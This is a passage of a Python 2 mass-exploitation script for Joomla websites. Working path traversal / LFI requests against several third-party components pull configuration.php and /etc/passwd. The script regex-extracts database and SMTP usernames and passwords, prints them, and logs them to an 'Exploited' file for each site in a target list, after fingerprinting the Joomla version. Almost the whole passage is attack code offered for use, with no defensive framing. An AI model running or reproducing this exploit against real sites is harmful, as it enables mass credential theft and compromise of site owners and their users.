    req = requests.get(url + '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def wd_download():
    req = requests.get(url + '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def jat3action():
    req = requests.get(url + '/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def com_community():
    req = requests.get(url + '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def download_monitor():
    req = requests.get(url + '/index.php?option=com_download-monitor&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def download_monitor():
    req = requests.get(url + '/index.php?option=com_download-monitor&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')





def Logger():
    try:
        if not os.path.exists('Exploited'):
            os.mkdir('Exploited', 0755);
    except:
        pass
        

def version_cms_detect():
    try:
        if requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_exploits_checker()
        elif requests.get(url + "/language/en-GB/en-GB.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/language/en-GB/en-GB.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_exploits_checker()
        elif requests.get(url + "/administrator/components/com_content/content.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/components/com_content/content.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_exploits_checker()
        elif requests.get(url + "/administrator/components/com_plugins/plugins.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/components/com_plugins/plugins.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_exploits_checker()
        elif requests.get(url + "/administrator/components/com_media/media.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/components/com_media/media.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_exploits_checker()
        else:
            print "[?] Fuck she is not Joomla :("
    except:
        pass

def joomla_exploits_checker():

    print "Exploiting CMS Joomla Target"
    print "=========================================="
    print "[EXP] COM_Hdflvplayer" #1
    com_hdflvplayer() 
    print "[EXP] COM_Cckjseblod " #2
    com_cckjseblod() 
    print "[EXP] COM_Joomanager" #3
    com_joomanager()
    print "[EXP] com_Aceftp" #4
    com_aceftp()
    print "[EXP] COM_Jtagmembersdirectory" #5
    com_jtagmembersdirectory()
    print "[EXP] COM_Macgallery" #6
    com_macgallery()
    print "[EXP] COM_Facegallery" #7
    com_macgallery()
    print "[EXP] COM_S5_media_player" #8
    s5_media_player() 
    print "[EXP] COM_Docman" #9
    com_docman()
    print "[EXP] MOD_Dvfoldercontent" #10
    mod_dvfoldercontent()
    print "[EXP] COM_Addproperty" #11
    com_addproperty()
    print "[EXP] COM_Contushdvideoshare" #12
    com_contushdvideoshare()
    print "[EXP] COM_Jetext" #13
    com_jetext()
    print "[EXP] COM_Product-modul" #14
    com_product_modul() 
    print "[EXP] COM_WDdownload" #15
    wd_download()                
    print "[EXP] COM_Jat3actiony" #16
    jat3action()
    print "[EXP] COM_Community" #17
    com_community()
    print "[EXP] COM_download_monitor" #18
    download_monitor()
    print "=========================================="





try:
    option_chosen = raw_input("option > ")
    if option_chosen == "EXP":
        requests.packages.urllib3.disable_warnings()
        file = raw_input("\033[92m[!]\033[0m Enter file: ")
        with open(file, "r") as ins:
            array = []
            for line in ins:
                array.append(line)
                url = line.strip()
                attack()
    else:
        option_chosen = raw_input("> ")
except KeyboardInterrupt:
    print "\nGood bye :("   
	
		
	
